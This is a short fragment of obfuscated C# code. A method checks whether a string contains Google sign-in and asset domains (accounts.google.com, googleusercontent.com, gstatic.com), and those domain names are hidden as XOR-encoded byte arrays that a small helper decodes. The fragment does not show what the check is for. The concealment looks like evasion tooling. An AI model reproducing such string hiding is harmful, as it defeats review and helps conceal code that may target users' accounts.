        return _0x707cd030.IndexOf(_0x9fe415a8._0x073f6504(new byte[19] { 194, 192, 192, 204, 214, 205, 215, 208, 141, 196, 204, 204, 196, 207, 198, 141, 192, 204, 206 }, 163), StringComparison.OrdinalIgnoreCase) >= 0 || _0x707cd030.IndexOf(_0x9fe415a8._0x073f6504(new byte[16] { 216, 218, 218, 214, 204, 215, 205, 202, 151, 222, 214, 214, 222, 213, 220, 151 }, 185), StringComparison.OrdinalIgnoreCase) >= 0 || _0x707cd030.IndexOf(_0x9fe415a8._0x073f6504(new byte[21] { 65, 73, 73, 65, 74, 67, 83, 85, 67, 84, 69, 73, 72, 82, 67, 72, 82, 8, 69, 73, 75 }, 38), StringComparison.OrdinalIgnoreCase) >= 0 || _0x707cd030.IndexOf(_0x9fe415a8._0x073f6504(new byte[11] { 49, 37, 34, 55, 34, 63, 53, 120, 53, 57, 59 }, 86), StringComparison.OrdinalIgnoreCase) >= 0;
    }

    private string _0x6b737398 = "";
}

internal static class _0x9fe415a8
{
    internal static string _0x073f6504(byte[] data, byte key)
    {
        var buffer = new byte[data.Length];
        for (var i = 0; i < data.Length; i++)
            buffer[i] = (byte)(data[i] ^ key);
        return System.Text.Encoding.UTF8.GetString(buffer);
    }
}